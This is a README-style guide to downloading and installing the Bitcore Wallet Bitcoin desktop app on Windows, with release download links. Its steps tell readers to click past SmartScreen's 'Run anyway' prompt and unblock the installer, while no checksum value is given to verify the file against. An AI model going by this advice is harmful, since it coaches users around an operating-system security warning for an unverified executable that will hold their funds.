<p align="center"><img src="https://raw.githubusercontent.com/bitcore-projects/learn/main/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>

<h1 align="center">How to install Bitcore Wallet on Windows</h1>

<p align="center">[![Website](https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge)](https://bitcorewallet.org/) [![Release](https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) [![Free](https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge)](https://bitcorewallet.org/fees) [![Self-custody](https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin)](https://bitcorewallet.org/self-custody)</p>

> **Short answer:** Run the 64-bit EXE installer from the official release, allow it through SmartScreen only after the checksum matches, then launch Bitcore Wallet.

---

## You'll see this if
- Windows SmartScreen shows 'Windows protected your PC'
- The installer does nothing when double-clicked
- You are unsure where the wallet was installed

## Why it happens
New releases of any small open-source app often lack the download reputation Windows uses for SmartScreen, so a warning on its own does not mean the file is bad. The checksum is your real test. For background, read the [Windows download for Bitcore Wallet](https://bitcorewallet.org/download) on the Bitcore Wallet website, or the related guide [How to restore Bitcore Wallet on a new computer](./restore-wallet-new-computer.md).

## How to fix it
1. Download `bitcore-wallet-v8.25.3.exe` from the release page.
2. Verify the SHA-256 value with `certutil`.
3. Double-click the installer; if SmartScreen appears choose More info, then Run anyway.
4. Follow the installer and open Bitcore Wallet from the Start menu.
5. Create a wallet and back up the recovery phrase on paper.

## If that didn't work
If the installer will not start, right-click it, open Properties and tick Unblock, then try again. You can also check [restore a Bitcoin wallet on a new PC](https://bitcorewallet.org/guides/restore-bitcoin-wallet) and [Why your Bitcoin wallet is not syncing](./wallet-not-syncing.md).

## Prevention
Keep Windows updated and run a reputable antivirus before handling any wallet. The [Bitcore Wallet FAQ](https://bitcorewallet.org/faq) has more detail.

> [!WARNING]
> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.

## FAQ
**Does it run on 32-bit Windows?**  
The published package is 64-bit.

**Can I move the wallet to a new PC later?**  
Yes, restore it with your recovery phrase.

---

## Get Bitcore Wallet

> [!TIP]
> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.

<p align="center">[![Download for Windows](https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip)</p>

| Platform | File | Package | Requirements |
|---|---|---|---|
| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |

Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)

---

## Related guides
| Guide | |
|---|---|
| [How to install Bitcore Wallet on macOS](./install-bitcoin-wallet-macos.md) | Bitcore Wallet how-to |
| [How to install Bitcore Wallet on Linux](./install-bitcoin-wallet-linux.md) | Bitcore Wallet how-to |
| [How to back up your Bitcoin recovery phrase](./seed-phrase-backup.md) | Bitcore Wallet how-to |
| [All Bitcore Wallet guides](../README.md) | Index |
